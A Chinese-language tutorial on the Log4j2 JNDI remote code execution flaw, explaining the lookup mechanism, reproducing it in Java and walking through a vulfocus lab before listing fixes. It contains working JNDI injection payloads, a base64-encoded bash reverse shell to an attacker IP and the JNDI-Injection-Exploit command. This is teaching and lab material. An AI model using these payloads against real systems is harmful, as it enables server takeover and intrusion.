[TOC]



# ==Log4J漏洞原理与实现==

教材内容

#### 一、漏洞简介

Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。

2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。

漏洞适用版本：2.0 <= Apache log4j2 <= 2.14.1。

### 二、漏洞原理

##### 1、原理概述

Apache log4j2-RCE 漏洞是由于Log4j2提供的lookup功能下的Jndi Lookup模块出现问题所导致的，该功能模块在输出日志信息时允许开发人员通过相应的协议去请求远程主机上的资源。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。

##### 2、JNDI

开发人员一般会使用log4j2在日志中输出一些变量，log4j2 除了可以输出程序中的变量，它还提供了多种lookup功能插件，可以用来查找更多数据用于输出。lookup在log4j2中，就是允许在输出日志的 时候，通过多种方式去查找要输出的内容，其中就可以使用Jndi Lookup 。

JNDI（Java Naming and Directory Interface，JAVA命名和目录接口）：它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。JNDI下面有很 多目录接口，用于不同的数据源的查找引用。

![image-20220328005223684](https://gitee.com/ymq_typroa/typroa/raw/main/20220328005223.png)

JNDI可以使用相应目录接口请求普通数据，还可以请求Java对象。而且**JNDI支持以命名引用（Naming References）的方式去远程下载一个class文件，然后加载该class文件并构建对象**。若下载的是攻击者构建的含有恶意代码的class文件，则会在加载时执行恶意代码。

在这些目录接口中**我们可以使用LDAP或RMI去下载远程主机上的class文件**。

LDAP（轻型目录访问协议）：是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问 控制和维护分布式信息的目录信息。目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈 树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。

RMI（远程方法调用）：它是一种机制，能够让在某个java虚拟机上的对象调用另一个Java虚拟机 的对象的方法。

##### 3、触发过程

**log4j2 远程代码执行漏洞大致过程（此处使用RMI，LDAP同理）： 假设有一个Java程序，将用户名信息到了日志中，如下**

1. **攻击者发送一个HTTP请求，其用户名为 `${jndi:rmi://rmi服务器地址/Exploit}`**
2. **被攻击服务器发现要输出的信息中有 ${}（这三个特殊符号要进行URL编码才行），则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用的是RMI（或者是LDAP），而后根据RMI（或LDAP）服务器地址去请求Exploit。**
3. **RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类），而该Reference指定了远端 文件下载服务器上含有恶意代码的class文件。**
4. **被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。**
5. **5.被攻击服务器下载恶意class文件并执行其中的恶意代码。**

![image-20220328003733232](https://gitee.com/ymq_typroa/typroa/raw/main/20220328003733.png)

#### 三、漏洞复现

##### 1、实验环境

本次实验在Windows环境下使用IDEA编写相应java程序来进行Apache log4j2 远程代码执行漏洞的模拟。

（1）jdk1.8.0_181

（2）Apache log4j2 2.14.1

##### 2、实验过程

创建一个Maven项目，在pom.xml文件中引入log4j依赖，指定版本为2.14.1。

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.14.1</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

先了解一下Log4J2的基本用法：

```java
package com.woniuxy.log4j;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class BasicUsage {    
    public static void main(String[] args) {
        //        Logger logger = LogManager.getRootLogger();        
        Logger logger = LogManager.getLogger(BasicUsage.class);        
        logger.trace("我是TRACE级别的日志");        
        logger.debug("我是DEBUG级别的日志");        
        logger.info("我是INFO级别的日志");        
        logger.warn("我是WARN级别的日志");        
        logger.error("我是ERROR级别的日志");        
        logger.fatal("我是FATAL级别的日志");        
        System.err.println("我是FATAL级别的日志");    
    }
}
```

> 默认输出的是 logger.error 级别及以上的
>
> ![image-20250126151001715](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126151001715.png)
>
> 我们可以自定义输出log级别，这个要使用 一个xml 文件来进行配置
>
> ![image-20250126150359738](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126150359738.png)
>
> 我们必须要在 resources 目录下创建一个名为 log4j2.xml 的xml文件
>

还可以通过配置，在resouces目录下创建一个名为：log4j2.xml的配置文件，可以用于将日志同步写入文件中。

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<configuration status="warn" monitorInterval="5">
    <!--定义Log4j2的组件-->
    <Appenders>
        <!--定义控制台输出的组件-->
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] [%-5level] %c{36}:%L --- %m%n"/>
        </Console>
        <!--定义文件输出的组件-->
        <File name="file" fileName="D:/Log4j2/log4j.log">
            <PatternLayout pattern="[%d{yyyy-MM-dd HH:mm:ss.SSS}] [%-5level] %l %c{36} - %m%n"/>
        </File>
    </Appenders>
    <Loggers>
        <!--设置日志级别是TRACE，等于以及高于此级别的日志才会输出-->
        <Root level="trace">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="file"/>
        </Root>
    </Loggers>
</configuration>
```

> 此时我们的输出就会变成：
>
> ![image-20250126150905308](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126150905308.png)

模拟黑客服务器：

1.创建EvilObj类，执行Windows命令打开计算器。

```java
public class EvilObj {     
    static {        
        System.out.println("执行恶意代码！");        
        try {            
            // 执行命令打开计算器            
            Runtime.getRuntime().exec("calc");        
        } 
        catch (IOException e) { 
            e.printStackTrace();        
        }    
    }
}
```

2.创建RMIServer类，用于开启RMI服务。

```java
public class RMIServer {    
    public static void main(String[] args) {        
        try {            
            // 启动rmi服务,端口为1099            
            LocateRegistry.createRegistry(1099);            
            Registry registry = LocateRegistry.getRegistry();            
            // 创建资源，指定资源为本机rmi目录下的EvilObj类            
            Reference reference = new Reference("rmi.EvilObj", "rmi.EvilObj", null);            
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);            
            // 绑定资源，用于客户机访问对应资源            
            registry.bind("evil", referenceWrapper);            
            System.out.println("RMI服务初始化完成");        
        } 
        catch (Exception e) {            
            e.printStackTrace();        
        }    
    }
}
```

模拟受害主机：

1.创建HackedServer类，模拟攻击者发送信息，受害服务器将对应信息作为error级别日志输出

```java
public class HackedServer {    
    // 创建日志记录器    
    private static final Logger logger = LogManager.getLogger();    
    public static void main(String... args) {        
        System.out.println("被攻击服务器");        
        // 模拟攻击者发送请求中的username字段，指向攻击者服务器上的恶意class        
        String username = "${jndi:rmi://192.168.200.95/evil}";        
        // 输出错误日志信息        
        logger.error("errorinfo： {}!",username);    
    }
}
```

攻击过程模拟：

1.运行RMIServer，启动RMI服务

![image-20220328004101148](https://gitee.com/ymq_typroa/typroa/raw/main/20220328004101.png)

2.运行HackedServer，模拟攻击者攻击受害主机，攻击成功，执行代码打开了计算器。

![image-20220328004120288](https://gitee.com/ymq_typroa/typroa/raw/main/20220328004120.png)

#### 四、靶场模拟

##### 1、实验环境

被攻击服务器主机：CentOS7

靶场环境：vulfocus/log4j2-rce-2021-12-09

攻击者

主机：kali

[JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar ，https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0

##### 2、实验过程

1. 安装docker

（1）安装docker所需工具：yum install -y yum-utils device-mapper-persistent-data lvm2

（2）添加yum镜像：yum-config-manager —add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo

（3）更新yum缓存：yum makecache fast

（4）下载安装docker：yum install docker-ce

（5）启动docker： systemctl start docker

（6）配置Docker的国内镜像：vi /etc/docker/daemon.json

```java
{    
    "registry-mirrors": [         
        "https://registry.docker-cn.com",         
        "http://hub-mirror.c.163.com",         
        "https://docker.mirrors.ustc.edu.cn"    
    ]
}
```

（7）保存并重启docker： systemctl restart docker 

2.使用docker部署log4j2 漏洞靶场

1. 使用docker部署log4j2 漏洞靶场

（1）拉取log4j2 漏洞的靶场镜像：docker pull vulfocus/log4j2-rce-2021-12-09

![image-20220328004632052](https://gitee.com/ymq_typroa/typroa/raw/main/20220328004632.png)

（2）创建容器并运行：docker run -tid -p 8080:8080 vulfocus/log4j2-rce-2021-12-09
（3）开启8080端口，访问web服务

![image-20220328004721413](https://gitee.com/ymq_typroa/typroa/raw/main/20220328004721.png)

1. 使用DNSLog进行测试

（1）前往http://www.dnslog.cn/，申请子域名进行测试

（2）在web主页面中点击 ????? ,url地址变为 http://192.168.219.166:8080/hello?payload=111，更改payload为`${jndi!:ldap://test.f2l309.dnslog.cn}`，并将payload进行url编码。

![image-20220328004844231](https://gitee.com/ymq_typroa/typroa/raw/main/20220328004844.png)

访问成功后，查看DNSLog的DNS查询记录，出现payload中的字段说明测试成功。

![image-20220328004943445](https://gitee.com/ymq_typroa/typroa/raw/main/20220328004943.png)

1. 利用JNDI注入反弹shell

（1）准备反弹shell，并将此命令进行base64编码，

```
bash -i >& /dev/tcp/攻击主机IP/端口 0>&1
```

（2）使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar进行漏洞利用，将上述base64编码结果填入指定位置，指定kali的IP，启动服务。

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base64编码后的shell}|{base64,-d}|{bash,-i}" -A 攻击主机IP
```

![image-20220328005025427](https://gitee.com/ymq_typroa/typroa/raw/main/20220328005025.png)

（3）使用nc监听5555端口

![image-20220328005049916](https://gitee.com/ymq_typroa/typroa/raw/main/20220328005049.png)

（4）更改payload为`${jndi:rmi://192.168.219.134:1099/hogsdg}`，让受害服务器访问在kali上开启的RMI服务。

![image-20220328005109158](https://gitee.com/ymq_typroa/typroa/raw/main/20220328005109.png)

（5）成功接收到反弹shell。

![image-20220328005127471](https://gitee.com/ymq_typroa/typroa/raw/main/20220328005127.png)

> 我们在这里来看一下详细的利用过程
>
> - 第一步：访问目标服务器，并进行payload 参数的传递来测试该系统是否存在Log4J2的漏洞
>
>   准备如下payload，并将payload 的值传递给 payload，查看是否进行了域名解析
>
>   ```
>   ${jndi!:ldap://test.f2l309.dnslog.cn}
>   ```
>
>   ![image-20250126194218508](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126194218508.png)
>
>   需要对特殊符号进行编码
>
>   ![image-20250126194316020](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126194316020.png)
>
>   当然，也可以直接全编码
>
>   ![image-20250126194231118](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126194231118.png)
>  
>     看下图，确实进行了域名解析，说明该处漏洞存在
>
> ![image-20250126194245442](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126194245442.png)
>
>   > 触发条件：当系统使用了 log4j 的 logger对象来写日志的时候，写的日志内容就是我们传入的payload参数。
>   >
>   > 然后我们就构造了一个特殊格式的日志，使用 `${}` 包裹起来的一段字符串，当 java 解析的时候，就发现这是一个变量的标识，然后解析里面的变量，发现里面是一个 jndi 的目录服务调用，然后就会使用 jndi 服务去调用它
>   >
>   > **所以在真实场景中，我们就要去寻找，什么东西很有可能会被记录在服务器日志当中（比如用户名）**
>
>   - 第二步：构造一个反弹shell的命令，并进行 base64 编码之后，使用 JNDI-Injection 的命令，将 base64 编码后的反弹shell 放在命令中即可实现漏洞利用
>
>     ```shell
>     bash -i >& /dev/tcp/攻击主机IP/端口 0>&1
>     bash -i >& /dev/tcp/47.96.116.171/8086 0>&1
>     
>     YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45Ni4xMTYuMTcxLzgwODYgMD4mMQ==
>     
>     java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base64编码后的shell}|{base64,-d}|{bash,-i}" -A 攻击主机IP
>     java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45Ni4xMTYuMTcxLzgwODYgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 192.168.112.233
>     ```
>
>     这句命令执行了之后，会开启一个 JNDI 的服务，我们选择他给出的一条 rmi，选取最下面这条 rmi 地址
>
>     ![image-20250126200814431](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126200814431.png)
>
>   - 第三步：利用选取的 rmi 地址，构建 payload 参数的值
>
>     ```shell
>     ${jndi!:rmi://192.168.112.233:1099/mlp5ho}
>     ```
>
>     ![image-20250126200926920](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126200926920.png)
>
>     ![image-20250126201116702](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250126201116702.png)
>
>     > 为神马监听的是 8086 端口呢？因为我们让目标服务器反弹shell的目标端口就是 `bash -i >& /dev/tcp/47.96.116.171/8086 0>&1` 8086 端口

#### 五、修复方案

升级log4j2到最新版本，修复后的log4j2在Jndi Lookup中增加了一些限制。

1. 默认不再支持命名引用的方式获取对象。
2. 限制JNDI默认可以使用的协议。默认情况下，JNDI 只支持 java、ldap 和 ldaps 协议。
3. 限制可以通过LDAP访问的服务器和类。